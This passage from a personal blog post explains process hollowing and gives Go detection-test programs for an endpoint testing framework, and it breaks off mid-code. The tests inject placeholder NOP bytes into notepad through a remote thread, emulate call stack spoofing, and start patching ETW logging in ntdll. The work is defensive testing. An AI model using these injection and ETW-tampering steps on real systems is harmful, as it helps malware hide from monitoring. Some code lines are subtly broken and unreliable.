<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000000" />

    <meta name="description" content="goPro: detecting process hollowing with Go">

    
        <title>goPro: detecting process hollowing with Go | à¼§</title>
    

    
    <link rel="stylesheet" type="text/css" href="/style.min.50e5dce6bdbdda9c021bb01730b34c1639e90db55e0fd1ed0f37771832d1ce47.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/about/">about</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/cv/">cv</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/posts/">posts</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/photography/">photography</a></li>
            
          </ul>
        </nav>
        



<div id="single-header">
  <h1>
    goPro: detecting process hollowing with Go
  </h1>
  <div id="single-meta">
    
    
        <span class="datesub">jan 12, 2024 &nbsp;&nbsp; m. jan 29, 2024</span>
      

  </div>
</div>



<aside class="toc" id="tableOfContentContainer">
  <nav id="TableOfContents">
  <ul>
    <li><a href="#what-exactly-is-process-hollowing">what exactly is process hollowing?</a>
      <ul>
        <li><a href="#tldr"><strong>tl;dr</strong>:</a></li>
      </ul>
    </li>
    <li><a href="#detecting-process-hollowing-with-go">detecting process hollowing with Go</a>
      <ul>
        <li><a href="#why-go-specifically">why Go, specifically?</a></li>
        <li><a href="#endpoint"><code>endpoint</code></a></li>
      </ul>
    </li>
    <li><a href="#call-stack-spoofing-via-synthetic-frames">call stack spoofing via synthetic frames</a></li>
    <li><a href="#evasion-via-event-tracing-for-windows-patching">evasion via event tracing for windows patching</a></li>
    <li><a href="#remote-thread-context-manipulation">remote thread context manipulation</a></li>
    <li><a href="#suspicious-windows-nt-api-hooking">suspicious windows NT API hooking</a></li>
    <li><a href="#net-com-object-creation-in-non-standard-windows-script-interpreter">.NET COM object creation in non-standard windows script interpreter</a></li>
    <li><a href="#potential-browser-exploit-via-fake-rpc-messages">potential browser exploit via fake RPC messages</a></li>
    <li><a href="#suspicious-api-from-an-unsigned-service-dll">suspicious API from an unsigned service DLL</a></li>
    <li><a href="#suspicious-kernel-mode-address-manipulation">suspicious kernel mode address manipulation</a></li>
    <li><a href="#conclusion">conclusion</a></li>
  </ul>
</nav>
</aside>


<main><p>if you ever find yourself in between jobs for an extended period of time, remember to take time off from bouncing from constantly worrying to being completely nihilistic. if you can spare the time and energy, it can be quite rewarding to find something that you can totally nerd out on. for me, it was the world of windows malware.</p>
<p>this could probably benefit from being part of a series, so i&rsquo;ll keep the contents of this post focused on the title. windows is a vast and strange land, and its architecture is both extremely well-studied and mysterious. there&rsquo;s a lot we know, but also a lot we don&rsquo;t know.</p>
<p>process hollowing, however, is quite well-documented. the inspiration behind this article and the code was <a href="https://posts.specterops.io/lateral-movement-with-the-net-profiler-8772c86f9523"  target="_blank" rel="noreferrer nofollow">this</a>
 interesting piece by daniel mayer, where he uses the windows .NET profiler to pull over your payload and execute it. the offensive value is intriguing, and i&rsquo;m sure we&rsquo;ll see more research in this area!</p>
<h2 id="what-exactly-is-process-hollowing">what exactly is process hollowing?</h2>
<h3 id="tldr"><strong>tl;dr</strong>:</h3>
<p>process hollowing (aka <a href="https://github.com/aaaddress1/RunPE-In-Memory"  target="_blank" rel="noreferrer nofollow">RunPE</a>
) is a method of process injection. what happens is original code + resources of a target process are replaced or removed, leaving behind bare process framework. the hollowed process becomes a host for injected malicious code, which is executed under the guise of a legit process.</p>
<p>the WinAPIs required for this are the usual suspects: <code>CreateProcess</code>, <code>NtUnmapViewOfSection</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, <code>ResumeThread</code>.</p>
<p>the attacker goes about this by launching a legit process (<code>notepad.exe</code> is a basic but popular choice) in a <strong>suspended state</strong>. this means the process is created but not executing any code.</p>
<p>what happens next is the hollowing: unmapping or deallocating the memory that contains the original executable code of the suspended process. the legitimate &ldquo;content&rdquo; is removed, leaving an empty process structure.</p>
<p>if the tactic hasn&rsquo;t been detected by this point, the attacker would then inject their own malicious code into the hollowed-out process. this is usually done by allocating memory in the process&rsquo;s address space and copying the malicious code into the space.</p>
<p>when process hollowing is successful, it should appear that a legitimate process is running. in reality, the process is executing the injected malicious code.</p>
<h2 id="detecting-process-hollowing-with-go">detecting process hollowing with Go</h2>
<p>i was preparing for an interview with ${company}, and the topic of writing detections in Go had come up. i hadn&rsquo;t really written much Go at this point, so i thought it would be fun to learn enough about the language to eventually use it to write detection scripts.</p>
<h3 id="why-go-specifically">why Go, specifically?</h3>
<p>Go is pretty well known for its performance and implementation of concurrency. process hollowing involves low-level operations on system processes, so being fast and efficient is crucial. the <code>goroutines</code> allow for concurrent operations, like monitoring/testing, without significant overhead (theoretically).</p>
<p>a big plus is that Go supports cross-platform code, so the tests could technically be adapted for a different OS. the standard library is pretty robust, and provided me with a lot of built-in tools that i&rsquo;d use for network communication, file I/O, and system interaction.</p>
<p>a lesser known (to me) advantage of Go is that its statically typed nature and compiled binaries help to create reliable and predictable behaviour. the binaries can be easily deployed without dependencies.</p>
<p>i also had a lot of fun writing + testing the scripts, because of the memory safety of Go&rsquo;s design and smooth error handling.</p>
<h3 id="endpoint"><code>endpoint</code></h3>
<p>${company} discussed using a module called <code>endpoint</code>. essentially, it&rsquo;s a library that facilitates the creation and execution (and reporting) of security tests. it abstracts a lot of the complexities that would be involved when interacting with the system, and provided a consistent interface for performing and reporting on various operations.</p>
<p>i won&rsquo;t share the code here, but i think it&rsquo;s fair to discuss the key components at work, since the code is public and we&rsquo;ll be discussing the tests i wrote in support of it.</p>
<p><strong>start and stop functions</strong>: manages the lifecycle of the tests (initialization to cleanup). the execution is kicked off with <code>Start(test fn, clean ...fn)</code> and stopped by <code>Stop(code int)</code>.</p>
<p>these functions run the test in a separate <code>goroutine</code> (which allows for concurrent execution), implement a timeout mechanism, and make sure the test is cleaned up properly (after providing a status code that signals the end of the test).</p>
<p><strong>system interaction + process management</strong>: this module is probably the most important, as it interacts with the OS for tasks like process creation, memory manipulation, and more.</p>
<p><code>Shell(args []string) (string, error)</code> executes a shell command and returns its output. <code>Write(filename string, contents []byte) error</code> and <code>Read(path string) []byte</code> handle writing data and reading data to/from the filesystem. <code>Remove(path string) bool</code> deletes a file at the specified path (important for cleanup).</p>
<p>some more functions include <code>AES256GCMEncrypt(data []byte) ([]byte, []byte, error)</code> and <code>AES256GCMDecrypt(data, key []byte) ([]byte, error)</code>, which handle encryption; <code>startDropperChildProcess()</code> and <code>writeIPC()</code>, which start a child process (&ldquo;dropper&rdquo;) and communicate with it via IPC, and more.</p>
<p>now, on to the tests!</p>
<h2 id="call-stack-spoofing-via-synthetic-frames">call stack spoofing via synthetic frames</h2>
<p><strong>call stack spoofing</strong> is an attack where the call stack is manipulated to make it appear as if a function was called by legitimate code. used to hide the origin of suspicious API calls, it makes tracing malicious behaviour more difficult.</p>
<p>this test attempts to detect when the call stack is artificially altered, which is often a sign of process hollowing (or ROP attacks).</p>
<p>the test starts by creating a legitimate process (<code>notepad.exe</code>) as its target. it then allocates memory within the target process and writes a NOP slide as a stand-in for malicious shellcode.</p>
<p>the key part of this test is <code>alterCallStack()</code>, where a trampoline function is used to alter the call stack. trampolines are used to change the execution flow (&ldquo;jumping&rdquo;) to conceal the origin of a malicious call.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Starting Call Stack Spoofing via Synthetic Frames [+]&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Start</span>(test, cleanup)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	proc.Handle <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">Handle</span>(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>	remoteProcHandle <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">Handle</span>(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">var</span> err <span style="color:#8be9fd">error</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// start process
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	cmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;notepad.exe&#34;</span>)
</span></span><span style="display:flex;"><span>	err = cmd.<span style="color:#50fa7b">Start</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to start process: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">defer</span> cmd.Process.<span style="color:#50fa7b">Kill</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// get process handle
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	procHandle, err = windows.<span style="color:#50fa7b">OpenProcess</span>(windows.PROCESS_ALL_ACCESS, <span style="color:#ff79c6">false</span>, <span style="color:#8be9fd;font-style:italic">uint32</span>(cmd.Process_Pid))
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to get process handle: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// allocate memory to target process
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> remoteAddr <span style="color:#8be9fd">uintptr</span>
</span></span><span style="display:flex;"><span>	remoteAddr, err = windows.<span style="color:#50fa7b">VirtualAllocEx</span>(procHandle, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">4096</span>, windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to allocate memory: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// write shellcode to allocated memory
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	shellcode <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">byte</span>{<span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>} <span style="color:#6272a4">// NOP slide placeholder
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> written <span style="color:#8be9fd">uint32</span>
</span></span><span style="display:flex;"><span>	err = windows.<span style="color:#50fa7b">WriteProcessMemory</span>(procHandle, remoteAddr, <span style="color:#ff79c6">&amp;</span>shellcode[<span style="color:#bd93f9">0</span>], <span style="color:#8be9fd;font-style:italic">uint32</span>(<span style="color:#8be9fd;font-style:italic">len</span>(shellcode)), <span style="color:#ff79c6">&amp;</span>written)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to write to process memory: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// create remote thread in target process
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> threadHandle windows.Handle
</span></span><span style="display:flex;"><span>	threadHandle, err = windows.<span style="color:#50fa7b">CreateRemoteThread</span>(procHandle, <span style="color:#ff79c6">nil</span>, <span style="color:#bd93f9">0</span>, remoteAddr, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">nil</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to create remote thread: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">defer</span> windows.<span style="color:#50fa7b">CloseHandle</span>(threadHandle)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// alter call stack
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#50fa7b">alterCallStack</span>()
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Call stack spoofing executed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED: Malicious behavior not blocked
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">alterCallStack</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// altering stack using trampoline function
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	trampoline <span style="color:#ff79c6">:=</span> syscall.<span style="color:#50fa7b">NewCallback</span>(<span style="color:#8be9fd;font-style:italic">func</span>() <span style="color:#8be9fd">uintptr</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// jump to real target func
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>	})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// allocate memory to trampoline func
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	mem, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">VirtualAlloc</span>(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">4096</span>, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to allocate memory for trampoline: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// write trampoline to allocated memory
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	trampolineAddr <span style="color:#ff79c6">:=</span> (<span style="color:#8be9fd">uintptr</span>)(unsafe.<span style="color:#50fa7b">Pointer</span>(trampoline))
</span></span><span style="display:flex;"><span>	trampolineSize <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">uintptr</span>(unsafe.<span style="color:#50fa7b">Sizeof</span>(trampoline))
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">copy</span>((<span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">*</span>[<span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">20</span>]<span style="color:#8be9fd">byte</span>)(unsafe.<span style="color:#50fa7b">Pointer</span>(mem)))[:], (<span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">*</span>[<span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">20</span>]<span style="color:#8be9fd">byte</span>)(unsafe.<span style="color:#50fa7b">Pointer</span>(trampolineAddr)))[:trampolineSize])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// call trampoline to alter call stack
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	syscall.<span style="color:#50fa7b">Syscall</span>(trampolineAddr, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Cleanup completed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><h2 id="evasion-via-event-tracing-for-windows-patching">evasion via event tracing for windows patching</h2>
<p><strong>ETW patching</strong> is when the Event Tracing for Windows (ETW) is disabled/modified. ETW is a key feature in Windows, used to log + trace events within the OS. by patching ETW, security tools can be prevented from logging malicious activity and attackers can evade detection.</p>
<p>the test first allocates memory within the target process and simulates patching ETW-related functions inside <code>ntdll.dll</code>. it replaces these functions with a simple <code>RET</code>, effectively disabling ETW logging for certain events.</p>
<p>it also includes a verification step to ensure that the patch was applied successfully, indicating an attempt to disable ETW.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Starting Evasion via Event Tracing for Windows Patching [+]&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Start</span>(test, cleanup)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	procHandle <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">Handle</span>(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">var</span> err <span style="color:#8be9fd">error</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// start process
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	cmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;notepad.exe&#34;</span>)
</span></span><span style="display:flex;"><span>	err = cmd.<span style="color:#50fa7b">Start</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to start process: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">defer</span> cmd.Process.<span style="color:#50fa7b">Kill</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// get process handle
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	procHandle, err = windows.<span style="color:#50fa7b">OpenProcess</span>(windows.PROCESS_ALL_ACCESS, <span style="color:#ff79c6">false</span>, <span style="color:#8be9fd;font-style:italic">uint32</span>(cmd.Process.Pid))
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to get process handle: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// allocate memory in target
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> remoteAddr <span style="color:#8be9fd">uintptr</span>
</span></span><span style="display:flex;"><span>	remoteAddr, err = windows.<span style="color:#50fa7b">VirtualAllocEx</span>(procHandle, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">4096</span>, windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to allocate memory: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// write dummy data to allocate memory [NOP slide to simulate patching]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	dummyData <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">byte</span>{<span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>}
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">var</span> written <span style="color:#8be9fd">uint32</span>
</span></span><span style="display:flex;"><span>	err = windows.<span style="color:#50fa7b">WriteProcessMemory</span>(procHandle, remoteAddr, <span style="color:#ff79c6">&amp;</span>dummyData[<span style="color:#bd93f9">0</span>], <span style="color:#8be9fd;font-style:italic">uint32</span>(<span style="color:#8be9fd;font-style:italic">len</span>(dummyData)), <span style="color:#ff79c6">&amp;</span>written)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> <span style="color:#ff79c6">||</span> written <span style="color:#ff79c6">!=</span> <span style="color:#8be9fd;font-style:italic">uint32</span>(<span style="color:#8be9fd;font-style:italic">len</span>(dummyData)) {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to write to process memory: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Verify the memory was patched
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#50fa7b">verifyMemoryPatch</span>(procHandle, remoteAddr, dummyData)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Attempt to patch ETW functions
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#50fa7b">patchETW</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] ETW patching executed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED: Malicious behavior not blocked
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">patchETW</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// patching ETW functions in ntdll.dll
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	ntdll <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">NewLazySystemDLL</span>(<span style="color:#f1fa8c">&#34;ntdll.dll&#34;</span>)
</span></span><span style="display:flex;"><span>	etwEventWrite <span style="color:#ff79c6">:=</span> ntdll.<span style="color:#50fa7b">NewProc</span>(<span style="color:#f1fa8c">&#34;EtwEventWrite&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// allocate memory for patch
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	mem, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">VirtualAlloc</span>(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">4096</span>, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to allocate memory for ETW patch: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// write patch to memory
